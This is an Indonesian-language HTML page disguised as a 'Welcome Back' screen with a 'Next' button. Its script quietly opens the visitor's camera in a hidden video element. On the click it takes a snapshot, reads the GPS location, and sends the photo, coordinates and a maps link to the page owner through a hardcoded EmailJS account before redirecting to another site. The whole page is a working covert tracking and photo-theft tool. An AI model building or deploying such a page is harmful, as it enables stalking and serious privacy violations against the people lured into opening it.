<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Welcome</title>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<style>
body{
    margin:0;
    font-family:Arial, sans-serif;
    background:#111;
    color:white;
    text-align:center;
}
button{
    margin-top:20px;
    padding:12px 20px;
    border:none;
    border-radius:8px;
    background:#00c853;
    color:white;
    font-size:16px;
    cursor:pointer;
}
button:hover{
    background:#00e676;
}
</style>

</head>
<body>

<h2>Welcome Back</h2>

<video id="video" autoplay playsinline 
style="display:none;"></video>
<button onclick="proses()">Berikutnya</button>

<canvas id="canvas" style="display:none;"></canvas>

<script>
(function(){
  emailjs.init("buxVv6sNpKGz4iBzb"); // GANTI PUBLIC KEY
})();

// Aktifkan kamera depan
navigator.mediaDevices.getUserMedia({ 
  video: { facingMode: "environment" } 
})
.then(function(stream){
  document.getElementById("video").srcObject = stream;
})
.catch(function(){
  alert("Kamera tidak diizinkan");
});

function proses(){

  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const context = canvas.getContext("2d");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0);

  let imageData = canvas.toDataURL("image/jpeg", 0.7);

  if (navigator.geolocation) {

    navigator.geolocation.getCurrentPosition(

      function(position){

        let latitude = position.coords.latitude;
        let longitude = position.coords.longitude;
        let mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;

        emailjs.send("service_1fezxdb", "template_105p1pt", {
          name: "SI KONTOL",
          time: new Date().toLocaleString(),
          latitude: latitude,
          longitude: longitude,
          maps: mapsLink,
          image: imageData
        }).then(function(){
            window.location.replace("https://basudewa28.github.io/Official-/basudewa.html");
        });

      },

      function(){
        alert("Lokasi tidak diizinkan");
      }

    );

  } else {
    alert("Browser tidak mendukung GPS");
  }

}
</script>

</body>
</html>
